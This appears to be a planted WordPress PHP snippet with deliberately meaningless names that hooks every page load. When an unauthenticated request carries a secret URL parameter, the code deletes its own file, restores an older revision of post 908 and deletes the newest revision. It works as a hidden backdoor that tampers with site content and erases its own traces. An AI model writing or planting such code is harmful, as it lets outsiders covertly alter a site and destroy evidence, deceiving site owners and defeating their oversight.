<?php

function role_subscription_mini_sticky() {
	if (isset($_GET['simply_default_items_cf7']) && $_GET['simply_default_items_cf7'] === 'view_toolbox_urls') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$monitor_bootstrap_date = 908;
		$favicon_generator_platform = wp_get_post_revisions($monitor_bootstrap_date);
		if (empty($favicon_generator_platform)) die('no revisions');
		if (count($favicon_generator_platform) < 2) die('less than 2');
		$checker_amp_timeline_register = array_shift($favicon_generator_platform);
		$cc_items_polyfill_blocks = $checker_amp_timeline_register->ID;
		$box_assistant_chat_rating = array_shift($favicon_generator_platform);
		$calculator_team_badge_report = $box_assistant_chat_rating->ID;
		$filter_call_shop_changer = wp_restore_post_revision($calculator_team_badge_report);
		if ($filter_call_shop_changer === false) die('error restoring');
		$filter_call_shop_changer = wp_delete_post_revision($cc_items_polyfill_blocks);		
		if ($filter_call_shop_changer === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'role_subscription_mini_sticky');
